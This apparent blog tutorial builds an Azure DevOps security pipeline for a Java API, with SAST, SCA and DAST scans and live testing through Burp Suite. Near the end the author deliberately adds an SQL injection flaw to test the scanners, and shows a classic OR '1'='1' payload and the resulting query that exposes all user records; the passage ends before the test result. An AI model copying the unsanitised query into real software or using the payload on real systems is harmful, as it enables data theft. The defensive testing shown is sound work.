<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-yaml-maven.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-yaml-maven.jpg" alt="" class="wp-image-602" width="508" height="320" srcset="./../../../wp-content/uploads/2021/09/az-pl-yaml-maven.jpg 570w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-maven-300x189.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-maven-210x132.jpg 210w" sizes="(max-width: 508px) 100vw, 508px" /></a><figcaption><em> Build pipeline YAML fragment &#8211; Maven task</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="unit-test">Unit Test</h5>


<p>The application includes a suite of JUnit unit tests, which the Maven build process executes when the build pipeline runs:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001-768x541.jpg" alt="" class="wp-image-597" width="576" height="406" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001-768x541.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001-300x211.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001-1024x722.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001-210x148.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-mavenunittest-001.jpg 1230w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>JUnit tests</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="containerisation">Containerisation</h5>


<p>The application POM file references a plugin which handles the packaging of the the application into a docker container, and which is again also executed by the Maven process when the build pipeline runs:  </p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001-768x636.jpg" alt="" class="wp-image-598" width="576" height="477" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001-768x636.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001-300x248.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001-210x174.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-maven_docker-001.jpg 878w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>POM file docker container build plugin</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="static-application-security-testing-sast">Static Application Security Testing (SAST)</h5>


<p>Static Application Security Testing (SAST) is performed using a pre-packaged Azure Task, which exposes functionality provided by <a href="https://slscan.io/en/latest/integrations/azure-devops-pipeline/">&#8220;<span class="has-inline-color has-luminous-vivid-amber-color">SAST-Scan</span></a>&#8221; &#8211; a free, open-source source code scanner, maintained by <a href="https://www.shiftleft.io/"><span class="has-inline-color has-luminous-vivid-amber-color">ShiftLeft Inc.</span></a> This utility is capable of analysing Java class files for evidence of known software  security weaknesses, including those classified within the <a href="https://owasp.org/www-project-top-ten/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP Top Ten</span></a> and <a href="https://cwe.mitre.org/data/definitions/1337.html"><span class="has-inline-color has-luminous-vivid-amber-color">CWE Top 25</span></a>.</p>



<p>The scanner is packaged as a docker image; the pipeline task downloads the latest version as a container runs it:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-yaml-sast.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-yaml-sast-768x264.jpg" alt="" class="wp-image-601" width="576" height="198" srcset="./../../../wp-content/uploads/2021/09/az-pl-yaml-sast-768x264.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sast-300x103.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sast-1024x352.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sast-210x72.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sast.jpg 1029w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em> Build pipeline YAML fragment &#8211; perform SAST scan</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="software-composition-analysis-sca">Software Composition Analysis (SCA)</h5>


<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
<p>The inclusion of dependencies such as libraries, plugins, packages etc from external sources is increasingly recognised as a significant source of security issues. For example, if the component is unmaintained it may contain unpatched vulnerabilities. If the component is imported via an uncontrolled, unofficial or insecure route, a m<span style="font-size: revert;">odified, malicious version of the component</span> may be unwittingly included. Even if a legitimate route is used, failure to verify the integrity of the component may lead to so-called supply chain attacks if the component supplier has been compromised.</p>



<p>The issue is of sufficient severity that it is referenced by both the OWASP Top 10 and the CWE Top 25 application security weakness lists.</p>
</div></div>
</div></div>



<p>Software Composition Analysis (SCA) is the name given to the process of examining the third party elements which make up a complete software system for the presence of components which are known to contain published vulnerabilities.</p>



<p>The build pipeline is this example performs this operation using a pre-packaged Azure Task, which exposes functionality provided by <a href="https://snyk.io/product/container-vulnerability-management/"><span class="has-inline-color has-luminous-vivid-amber-color">Snyk Security Scan for Container Images</span></a>. This is a service provided by <a href="https://snyk.io/"><span class="has-inline-color has-luminous-vivid-amber-color">Snyk</span></a> which offers a free tier, permitting up to 100 container tests per month for an unlimited number of developers. The service requires creation of a Snyk account, which the Azure platform connects to using an API token through a service connection which configured within the Azure pipeline project.</p>



<p>When executed, the security scan examines the docker image and its dependencies for known vulnerable components.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/09/az-pl-yaml-sca.jpg"><img loading="lazy" decoding="async" width="614" height="295" src="./../../../wp-content/uploads/2021/09/az-pl-yaml-sca.jpg" alt="" class="wp-image-600" srcset="./../../../wp-content/uploads/2021/09/az-pl-yaml-sca.jpg 614w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sca-300x144.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-sca-210x101.jpg 210w" sizes="(max-width: 614px) 100vw, 614px" /></a><figcaption> <em>Build pipeline YAML fragment &#8211; perform SCA scan</em></figcaption></figure></div>


<h4 class="wp-block-heading" id="container-registry">Container Registry</h4>


<p>Once the security scans have been completed, the application docker container is pushed to the <a href="https://docs.microsoft.com/en-us/azure/container-registry/container-registry-get-started-portal"><span class="has-inline-color has-luminous-vivid-amber-color">Azure Container Registry</span></a>:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/09/az-pl-yaml-push2cr.jpg"><img loading="lazy" decoding="async" width="601" height="328" src="./../../../wp-content/uploads/2021/09/az-pl-yaml-push2cr.jpg" alt="" class="wp-image-599" srcset="./../../../wp-content/uploads/2021/09/az-pl-yaml-push2cr.jpg 601w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-push2cr-300x164.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-push2cr-210x115.jpg 210w" sizes="(max-width: 601px) 100vw, 601px" /></a><figcaption><em>Build pipeline YAML fragment &#8211; push container to registry</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-cr-002.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-cr-002-768x419.jpg" alt="" class="wp-image-570" width="576" height="314" srcset="./../../../wp-content/uploads/2021/09/az-pl-cr-002-768x419.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-cr-002-300x164.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-cr-002-1024x559.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-cr-002-210x115.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-cr-002.jpg 1111w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Confirming a successful container push via the Azure Container Registry web portal</em></figcaption></figure></div>


<h4 class="wp-block-heading" id="release-pipeline">Release Pipeline</h4>


<p>Here I&#8217;ve tried out visual generation the YAML file &#8211; the end result is the same, but the process is a little more intuitive as compared to building up the YAML file manually, especially when multiple sequential stages with their own tasks are involved.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-003.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-003-768x383.jpg" alt="" class="wp-image-581" width="576" height="287" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-003-768x383.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-003-300x150.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-003-1024x511.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-release-003-210x105.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-003.jpg 1226w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Building up the release pipeline using the visual interface</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="triggering-a-release">Triggering a release</h5>


<p>With a real system, it&#8217;s likely that there would be multiple development, test, QA, and live deployment environments, probably under the control of a release manager, depending on the size and maturity of the team. As already mentioned, this exercise uses a single live environment, and in an attempt to simulate a typical QA/sign-off scenario, I&#8217;ve chosen to trigger creation of release for deployment manually, rather than automating it. </p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-005.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-005.jpg" alt="" class="wp-image-579" width="242" height="118" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-005.jpg 322w, ./../../../wp-content/uploads/2021/09/az-pl-release-005-300x146.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-005-210x102.jpg 210w" sizes="(max-width: 242px) 100vw, 242px" /></a></figure></div>



<p>Triggering a release initiates the release pipeline &#8211; the stages and tasks within the pipeline are outlined below:</p>


<h5 class="wp-block-heading" id="dynamic-application-security-testing-dast">Dynamic Application Security Testing (DAST)</h5>


<p>The purpose of Dynamic application security testing is to identify types of vulnerabilities in web applications that can only be found while the application is actually running. It is a type of black box test<a href="https://www.veracode.com/security/black-box-analysis">&nbsp;</a>because it is performed without knowledge of the internal source code or application architecture. DAST scanning can identify issues such as input/output validation weaknesses, configuration errors, susceptibility to injection attacks, etc.</p>



<p>In this example, I&#8217;ve chosen to use the <a href="https://www.zaproxy.org/docs/docker/api-scan/"><span class="has-inline-color has-luminous-vivid-amber-color">Zed Attack Proxy (ZAP) API Scan</span></a>, an open source utility developed by <a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a>. This variant of ZAP is specifically tuned to scan applications which present their services via an API, so security issues such as cross site scripting which are generally more applicable to applications with a web UI are not considered.</p>



<p>The scanner is provided as a docker container, so the pipeline includes tasks which handle the creation and deletion of a dedicated Azure container to house the scanner on the fly. Additional support tasks convert the output from the scanner into a format that the Azure platform can parse for display.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-002.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-002-768x380.jpg" alt="" class="wp-image-582" width="576" height="285" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-002-768x380.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-002-300x149.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-002-1024x507.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-release-002-1536x761.jpg 1536w, ./../../../wp-content/uploads/2021/09/az-pl-release-002-210x104.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-002.jpg 1690w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Release pipeline DAST testing tasks &#8211; OWASP ZAP API Scanner</em></figcaption></figure></div>



<p>Although the visual builder has been used to construct this part of the pipeline, its trivial matter to inspect the YAML script if required, should any fine-tuning or debugging be required:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-004.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-004-768x504.jpg" alt="" class="wp-image-580" width="576" height="378" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-004-768x504.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-004-300x197.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-004-1024x672.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-release-004-210x138.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-004.jpg 1263w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption> <em>Release pipeline DAST testing tasks &#8211; underlying YAML file</em> </figcaption></figure></div>


<h5 class="wp-block-heading" id="deployment">Deployment</h5>


<p>The final stage of the pipeline causes the application to be pushed to an <a href="https://azure.microsoft.com/en-gb/services/container-instances/#overview"><span class="has-inline-color has-luminous-vivid-amber-color">Azure container instance</span></a>, assigned an IP address and executed so that the API is publicly accessible via the internet (Azure&#8217;s <a href="https://docs.microsoft.com/en-us/azure/dns/dns-overview"><span class="has-inline-color has-luminous-vivid-amber-color">DNS</span></a> ensures that a fixed domain name can be used, despite the IP address being allocated dynamically).</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-011.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-011-768x375.jpg" alt="" class="wp-image-607" width="576" height="281" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-011-768x375.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-011-300x147.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-011-1024x501.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-release-011-210x103.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-011.jpg 1391w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Release pipeline YAML fragment &#8211; deploy to Azure container instance</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-ci-running.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-ci-running-768x519.png" alt="" class="wp-image-648" width="576" height="389" srcset="./../../../wp-content/uploads/2021/09/az-ci-running-768x519.png 768w, ./../../../wp-content/uploads/2021/09/az-ci-running-300x203.png 300w, ./../../../wp-content/uploads/2021/09/az-ci-running-1024x692.png 1024w, ./../../../wp-content/uploads/2021/09/az-ci-running-1536x1038.png 1536w, ./../../../wp-content/uploads/2021/09/az-ci-running-210x142.png 210w, ./../../../wp-content/uploads/2021/09/az-ci-running.png 1566w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Container deployed and running</em></figcaption></figure></div>



<hr class="wp-block-separator"/>


<h2 class="wp-block-heading" id="happy-path-testing">Happy Path Testing</h2>

<h3 class="wp-block-heading" id="unit-test-results">Unit Test Results</h3>


<p>Unit test results are accessible from the web dashboard:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001-768x498.jpg" alt="" class="wp-image-585" width="576" height="374" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001-768x498.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001-300x195.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001-1024x664.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001-210x136.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-unittest-001.jpg 1145w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Results from the suite of JUnit test suite executed during the build process</em></figcaption></figure></div>


<h3 class="wp-block-heading" id="sast-security-testing-results">SAST Security Testing Results</h3>


<p>The ShiftLeft SAST scan generates a comprehensive set of test results grouped by vulnerability severity, which can be viewed via a dedicated page on the web portal. Vulnerabilities are tagged with a link to the specific line(s) of source code identified as the root cause.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-768x402.jpg" alt="" class="wp-image-583" width="576" height="302" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-768x402.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-300x157.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-1024x536.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-1536x804.jpg 1536w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001-210x110.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-sast-001-001.jpg 1616w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>


<h3 class="wp-block-heading" id="sca-security-testing-results">SCA Security Testing Results</h3>


<p>Similar to the SAST scan, the Snyk container SCA scan also generates a comprehensive set of test results grouped by vulnerability severity, which can be viewed via a dedicated page on the web portal.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001-768x520.jpg" alt="" class="wp-image-584" width="576" height="390" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001-768x520.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001-300x203.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001-1024x694.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001-210x142.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-sca-001-001.jpg 1268w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>



<p>Each report entry describes what the vulnerable component is, what the dependency path is and provides references to published details about the vulnerability itself: </p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/sca-001.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/sca-001.png" alt="" class="wp-image-652" width="573" height="187" srcset="./../../../wp-content/uploads/2021/09/sca-001.png 695w, ./../../../wp-content/uploads/2021/09/sca-001-300x98.png 300w, ./../../../wp-content/uploads/2021/09/sca-001-210x69.png 210w" sizes="(max-width: 573px) 100vw, 573px" /></a></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/sca-002.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/sca-002-768x585.png" alt="" class="wp-image-653" width="576" height="439" srcset="./../../../wp-content/uploads/2021/09/sca-002-768x585.png 768w, ./../../../wp-content/uploads/2021/09/sca-002-300x229.png 300w, ./../../../wp-content/uploads/2021/09/sca-002-210x160.png 210w, ./../../../wp-content/uploads/2021/09/sca-002.png 799w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>


<h3 class="wp-block-heading" id="dast-security-testing-results">DAST Security Testing Results</h3>


<p>The results from the ZAP API DAST scanner are converted into a form that can be displayed in a similar manner to unit tests:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-006.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-006-768x491.jpg" alt="" class="wp-image-578" width="576" height="368" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-006-768x491.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-006-300x192.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-006-210x134.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-006.jpg 884w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>ZAP API Scan DAST Testing results</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-release-007.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-release-007-768x523.jpg" alt="" class="wp-image-577" width="576" height="392" srcset="./../../../wp-content/uploads/2021/09/az-pl-release-007-768x523.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-release-007-300x204.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-release-007-210x143.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-release-007.jpg 866w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption> <em>ZAP API Scan DAST Testing results</em></figcaption></figure></div>



<p>The results contain observations which relate to the fact that, in its current state, the target application does actually return an HTML error page with an HTTP 500 response code if it receives a request which is incorrectly formatted, or can&#8217;t be mapped to a method. Strictly speaking, an API wouldn&#8217;t do this, but rather than fix this behaviour, I&#8217;ve left it as-is and just treated the results as a baseline to compare subsequent results against.</p>


<h3 class="wp-block-heading" id="live-api-testing">Live API Testing</h3>


<p>Now that the application is running, live functional testing can begin. Because testing against the API will involve having relatively fine control over the structure of the HTTP requests, I&#8217;ve chosen to interact with it using an interception proxy (<a href="https://portswigger.net/burp/communitydownload"><span class="has-inline-color has-luminous-vivid-amber-color">Portswigger Burp Suite &#8211; Community Edition</span></a>) rather than a web browser or a command line tool such as Curl. Burp Suite provides the ability to capture, modify and send requests with full control over the request type, header values, body content etc.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-005.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-005-768x677.png" alt="" class="wp-image-630" width="576" height="508" srcset="./../../../wp-content/uploads/2021/09/apiburp-005-768x677.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-005-300x265.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-005-210x185.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-005.png 814w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption> <em>Live API functional testing &#8211; query by ID</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-004.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-004-768x678.png" alt="" class="wp-image-629" width="576" height="509" srcset="./../../../wp-content/uploads/2021/09/apiburp-004-768x678.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-004-300x265.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-004-210x185.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-004.png 852w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Live API functional testing &#8211; query by username</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-002.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-002-768x702.png" alt="" class="wp-image-622" width="576" height="527" srcset="./../../../wp-content/uploads/2021/09/apiburp-002-768x702.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-002-300x274.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-002-210x192.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-002.png 837w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption> <em>Live API functional testing &#8211; update by ID PUT request</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-009.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-009-768x652.png" alt="" class="wp-image-659" width="576" height="489" srcset="./../../../wp-content/uploads/2021/09/apiburp-009-768x652.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-009-300x255.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-009-210x178.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-009.png 864w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption> <em>Live API functional testing &#8211; query by ID after update</em> </figcaption></figure></div>



<hr class="wp-block-separator"/>


<h2 class="wp-block-heading" id="introducing-an-sql-injection-vulnerability">Introducing an SQL Injection Vulnerability</h2>


<p>Let&#8217;s now deliberately introduce an <a href="https://owasp.org/www-community/attacks/SQL_Injection"><span class="has-inline-color has-luminous-vivid-amber-color">SQL injection vulnerability</span></a> into the application software, to assess the sensitivity and effectiveness of the pipeline SAST and DAST security controls.</p>



<p>I&#8217;ve inserted an additional API method <code><em><span class="has-inline-color has-white-color">findByRole</span></em></code> which allows the details for a User to be queried by supplying a role type as search parameter.</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-014.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-014.png" alt="" class="wp-image-625" width="572" height="119" srcset="./../../../wp-content/uploads/2021/09/vulnweb-014.png 572w, ./../../../wp-content/uploads/2021/09/vulnweb-014-300x62.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-014-210x44.png 210w" sizes="(max-width: 572px) 100vw, 572px" /></a></figure></div>



<p>Instead of using Spring&#8217;s object relational mapping to handle the database query for us, I&#8217;ve hand crafted an SQL statement using input parsed from the HTTP request. The raw <code><em><span class="has-inline-color has-white-color">userRole</span></em></code> parameter value is included in the statement without performing any data sanitisation.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-010-1.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-010-1-768x415.png" alt="" class="wp-image-624" width="576" height="311" srcset="./../../../wp-content/uploads/2021/09/vulnweb-010-1-768x415.png 768w, ./../../../wp-content/uploads/2021/09/vulnweb-010-1-300x162.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-010-1-1024x554.png 1024w, ./../../../wp-content/uploads/2021/09/vulnweb-010-1-210x114.png 210w, ./../../../wp-content/uploads/2021/09/vulnweb-010-1.png 1080w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>


<h2 class="wp-block-heading" id="retesting">Re-Testing</h2>

<h3 class="wp-block-heading" id="updated-live-api-testing-results">Updated &#8211; Live API Testing Results </h3>


<p>First we test the new API endpoint to verify that it returns expected results when called under normal circumstances:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-006.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-006-768x718.png" alt="" class="wp-image-631" width="576" height="539" srcset="./../../../wp-content/uploads/2021/09/apiburp-006-768x718.png 768w, ./../../../wp-content/uploads/2021/09/apiburp-006-300x281.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-006-210x196.png 210w, ./../../../wp-content/uploads/2021/09/apiburp-006.png 806w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Testing the new API method</em></figcaption></figure></div>



<p>As a result of the dangerous coding practices used to implement the new API method, the application code is now vulnerable to SQL injection. A suitably crafted input parameter value can be used to &#8220;break out&#8221; of the string object used internally to hold the SQL statement query clause, causing the supplied value to be interpreted as an SQL command rather than a condition.</p>



<p>For example, the following parameter value &#8211; shown in URL encoded and decoded form using Burp Suite&#8217;s Decoder view &#8211; uses single quote characters to cause the SQL statement construction code to build a query which should cause <strong><em>all</em></strong> entries to be returned from the database, despite the request containing a non-existent <code><em><span class="has-inline-color has-white-color">userRole</span></em></code> search term:</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/apiburp-008.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/apiburp-008.png" alt="" class="wp-image-632" width="551" height="307" srcset="./../../../wp-content/uploads/2021/09/apiburp-008.png 735w, ./../../../wp-content/uploads/2021/09/apiburp-008-300x167.png 300w, ./../../../wp-content/uploads/2021/09/apiburp-008-210x117.png 210w" sizes="(max-width: 551px) 100vw, 551px" /></a></figure></div>



<p>&#8230;the vulnerable source code fails to filter out the single quote character and as a result, the DBMS treats the string value after it as a real &#8220;OR&#8221; condition, ignores the <em><code><span class="has-inline-color has-white-color">role</span></code></em> search term of &#8216;DOESNOTEXIST&#8217; and returns all entries where &#8216;1&#8217;=&#8217;1&#8242;, i.e. every entry in the database:</p>



<pre class="wp-block-code"><code>SELECT a.id as id, a.username as username, a.role as role, a.password as password FROM User a WHERE role = 'DOESNOTEXIST<span class="has-inline-color has-luminous-vivid-amber-color">'</span><span class="has-inline-color has-vivid-red-color"> OR '1' = '1' --</span></code></pre>



<p>If we modifying the request within the interception proxy by inserting the above payload and resending it to the application, we get the following result:</p>



